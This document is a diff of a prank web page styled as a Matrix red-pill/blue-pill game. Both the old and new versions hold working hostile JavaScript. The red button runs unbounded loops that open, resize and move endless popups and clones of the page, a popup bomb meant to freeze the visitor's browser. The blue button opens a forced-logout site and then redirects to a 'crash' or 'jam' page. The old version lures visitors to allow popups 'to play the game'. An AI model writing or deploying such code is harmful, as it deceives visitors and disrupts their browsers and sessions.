@@ -1,144 +1,133 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link href='https://fonts.googleapis.com/css?family=Astloch' rel='stylesheet'>
-    <title>Matrix</title>
-    <style>
-      body {
-        background: #293437;
-        margin-left: 30%;
-        margin-right: 30%;
-        margin-top: 5%;
-        margin-bottom: 5%;
-        font-family: 'Astloch';
-      }
-      .buttonred {
-        background: #C21D44;
-        font-family: 'Astloch', sans-serif;
-        width: 13%;
-        padding-top: 5px;
-        padding-bottom: 5px;
-        margin-left: auto;
-        margin-right: auto;
-        color: #C21D44;
-        border: 3px solid #C21D44;
-        display: block;
-        align-items: center;
-        transition: 0.3s ease-in-out;
-        border-radius: 20px;
-        font-size: 20px;
-      }
-      .buttonblue {
-        background: #256498;
-        font-family: 'Astloch', sans-serif;
-        width: 13%;
-        padding-top: 5px;
-        padding-bottom: 5px;
-        margin-left: auto;
-        margin-right: auto;
-        color: #256498;
-        border: 3px solid #256498;
-        display: block;
-        align-items: center;
-        transition: 0.3s ease-in-out;
-        border-radius: 20px;
-        font-size: 20px;
-      }
-      .buttonred:hover {
-        animation: fly 1s;
-        transition: 0.3s ease-in-out;
-      }
-      .buttonblue:hover {
-        animation: fly 1s;
-        transition: 0.3s ease-in-out;
-      }
-      .text {
-        color: #93E5BE;
-        font-family: 'Astloch', sans-serif;
-        font-size: 40px;
-        transition: 0.5s ease;
-        text-align: center;
-      }
-      .text2 {
-        color: #93E5BE;
-        font-family: 'Astloch', sans-serif;
-        font-size: 20px;
-        transition: 0.5s ease;
-        text-align: center;
-      }
-      div {
-        background: #182225;
-        padding: 10px;
-        border-radius: 10px;
-      }
-      @keyframes fly {
-        0% { transform: translate(0px,0px) rotate(0deg); }
-        25% { transform: translate(0px,0px) rotate(20deg); }
-        50% { transform: translate(0px,0px) rotate(-20deg); }
-        75% { transform: translate(0px 0px) rotate(0deg); }
-        100% { transform: translate(0px,0px) rotate(0deg); }
-      }
-      @keyframes down {
-        0% { transform: translate(0px,0px) rotate(0deg); }
-        25% { transform: translate(0px,0px) rotate(0deg); }
-        50% { transform: translate(0px,0px) rotate(0deg); }
-        75% { transform: translate(0px 0px) rotate(0deg); }
-        100% { transform: translate(0px,0px) rotate(0deg); }
-      }
-      @media only screen and (max-width: 768px) {
-        body {
-          margin-left: 5%;
-          margin-right: 5%;
-        }
-      }
-    </style>
-    <div>
-    <h1 class="text">Matrix.</h1>
-    <button class="buttonred" onclick="javascript:redPill()">|</button>
-    <br>
-    <button class="buttonblue" onclick="javascript:bluePill()">|</button>
-    <h2 class="text2">Choose a button.</h2>
-    </div>
-    <script>
-    var url = window.location.pathname;
-      function getRandomInt(min, max) {
-        min = Math.ceil(min);
-        max = Math.floor(max);
-        return Math.floor(Math.random() * (max - min) + min);
-      }
-      var randomNumber = getRandomInt(0,9);
-      function redPill() {
-        if (confirm("Are you sure?")) {
-	        window.alert("Please allow popups on this website to play the game!")
-          var fakeWindow = window.open("",);
-          for (let i=0; i<694200; i++) {
-            var spamWindow = window.open(randomLink, "", "width=1920, height=1080");
-            var smallWindow = window.open(url, "", "width=1920,height=1080");
-            var randomNumber = getRandomInt(0,9);
-            var randomLink = 'https://www.google.com/search?q=' + randomNumber
-	    var openMass = window.open("https://182exe.github.io/matrix/666.html", "", "1920px", "1080px");
-            for (let i=0; i<5; i++) {
-              var randomLink = randomLink + randomNumber
-              var randomNumber = getRandomInt(100,999);
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="title" content="Matrix" />
+        <meta name="og:title" content="Matrix" />
+        <meta name="og:description" content="Red or Blue?" />
+        <meta name="og:type" content="website" />
+        <meta name="og:url" content="https://182exe.xyz/matrix" />
+        <meta name="og:image" content="https://raw.githubusercontent.com/google/material-design-icons/master/png/social/sentiment_very_dissatisfied/materialiconstwotone/24dp/1x/twotone_sentiment_very_dissatisfied_black_24dp.png" />
+        <link rel="shortcut icon" type="image/jpg" href="https://raw.githubusercontent.com/google/material-design-icons/master/png/social/sentiment_very_dissatisfied/materialiconstwotone/24dp/1x/twotone_sentiment_very_dissatisfied_black_24dp.png" />
+        <link rel="icon" type="image/jpg" href="https://raw.githubusercontent.com/google/material-design-icons/master/png/social/sentiment_very_dissatisfied/materialiconstwotone/24dp/1x/twotone_sentiment_very_dissatisfied_black_24dp.png" />
+        <title>Matrix</title>
+        <link href='https://fonts.googleapis.com/css?family=Astloch' rel='stylesheet'>
+        <style>
+            :root {
+                --background: #3C3744;
+                --text: #EFEFEF;
+                --red: #D1345B;
+                --blue: #3F84E5;
+                --darken: rgba(0,0,0,0.1);
             }
-            var randomLink = 'https://www.google.com/search?q='
-          }
-        } else {
-          window.alert("All right. Try again when you're ready.")
-        }
-      }
-      function bluePill() {
-        if (confirm("Are you sure?")) {
-	        var crashLMFAO = window.open("https://182exe.github.io/jam/", "")
-	        window.alert("Please allow popups on this website to play the game!")
-          for (let i=0; i<5; i++) {
-            var smallWindow = window.open(url, "", "width=1920,height=1080");
-          }
-        } else {
-          window.alert("All right. Try again when you're ready.")
-        }
-      }
-  </script>
-  </body>
+            html {
+                height: 100%;
+            }
+            body {
+                min-height: 100%;
+                margin: 0;
+                display: grid;
+                grid-template-areas: auto;
+                justify-content: center;
+                align-items: center;
+                background: var(--background);
+
+                font-family: 'Astloch', monospace;
+                font-size: 2vw;
+                color: var(--text);
+                overflow: hidden;
+                text-align: center;
+            }
+            p {
+                transition: 0.5s cubic-bezier(0.5,0,0,0.5);
+            }
+            p:hover {
+                transform: scale(120%);
+                transition: 0.5s cubic-bezier(0.5,0,0,0.5);
+            }
+            #box {
+                display: flex;
+                flex-flow: column wrap;
+                align-items: center;
+                justify-content: center;
+                align-content: center;
+                padding: 2vw;
+                padding-left: 8vw;
+                padding-right: 8vw;
+                background: var(--darken);
+                border-radius: 2vw;
+                width: 50%;
+            }
+            #pillbox {
+                padding: 1vw;
+                display: flex;
+                flex-flow: column wrap;
+                align-items: center;
+                justify-content: center;
+                align-content: center;
+                gap: 1vw;
+                border-radius: 1vw;
+                background: var(--darken);
+            }
+            .button {
+                border-radius: 100em;
+                padding: 1vw;
+                border: none;
+                width: 6vw;
+                transition: 0.5s cubic-bezier(0.5,0,0,0.5);
+            }
+            .button:hover {
+                transform: scale(110%) rotate(5deg);
+                transition: 0.5s cubic-bezier(0.5,0,0,0.5);
+            }
+            .red { background: var(--red); }
+            .blue { background: var(--blue); }
+        </style>
+        <div>
+            <div id="box">
+                <p>Matrix.</p>
+                <div id="pillbox">
+                    <button class="button red" onclick="redPill()"></button>
+                    <button class="button blue" onclick="bluePill()"></button>
+                </div>
+                <p>Choose a button.</p>
+            </div>
+        </div>
+        <script>
+            document.body.addEventListener('mousemove', (e) => {
+                let ivalueX = (e.pageX * -1 / 60);
+                let ivalueY = (e.pageY * -1 / 60);
+                document.querySelector('#box').style.transform = `translate3d(${ivalueX}px, ${ivalueY}px, 0)`;
+            })
+
+            function redPill() {
+                let e, g, six, gURL;
+                for (let i = 0; i > -1; i++) {
+                    for (let i = 0; i > 0; i++) {
+  	  	  	  	  	    let googleWindow = window.open(`https://www.google.com/search?q=${Math.random() * 100000}${Math.random() * 100000}`);
+  	  	  	  	  	    let cloneWindow = window.open(window.location.pathname, "", "1920px", "1080px");
+  	  	  	  	    };
+                    
+                    gurl = `https://google.com/search?q=get+matrixed+lol+${Math.random()}`;
+                    
+                    g = window.open(gurl, ``, `width=0px`);
+                    g.resizeTo(500, 500);
+                    g.moveTo(Math.floor(Math.random() * (screen.width + 1)), Math.floor(Math.random() * (screen.width + 1)));
+
+                    e = window.open(window.location.pathname, ``, `width=1000px`);
+                    e.moveTo(0, 0);
+                    e.resizeTo(screen.width, screen.height);
+                }
+            };
+
+            function bluePill() {
+                let superLogOut = window.open(`https://superlogout.github.io`, ``, `width=0px`);
+                superLogOut.resizeTo(500, 500);
+                superLogOut.moveTo(Math.floor(Math.random() * (screen.width + 1)), Math.floor(Math.random() * (screen.width + 1)));
+                setTimeout(() => {
+                    window.location.replace(`https://182exe.xyz/jam`);
+                }, 1000);
+            }
+        </script>
+        </body>
 </html>
